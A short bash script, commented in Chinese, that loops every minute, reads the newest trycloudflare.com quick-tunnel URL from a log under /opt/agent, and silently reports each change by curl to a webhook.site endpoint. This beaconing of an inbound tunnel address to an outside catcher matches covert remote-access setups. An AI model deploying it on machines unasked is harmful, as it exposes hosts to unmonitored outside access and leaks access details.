#!/bin/bash
# 监控cloudflared隧道URL变化并上报webhook.site
W="${URLWATCH_WEBHOOK:-https://webhook.site/your-own-uuid}"   # 交付版已移除私有上报地址，运行时用环境变量指定
CUR=""
while true; do
  U=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /opt/agent/cf.log 2>/dev/null | tail -1)
  if [ -n "$U" ] && [ "$U" != "$CUR" ]; then
    CUR="$U"
    echo "$U" > /opt/agent/url.current
    curl -s --max-time 8 "$W/?step=url&u=$U" >/dev/null 2>&1
  fi
  sleep 60
done
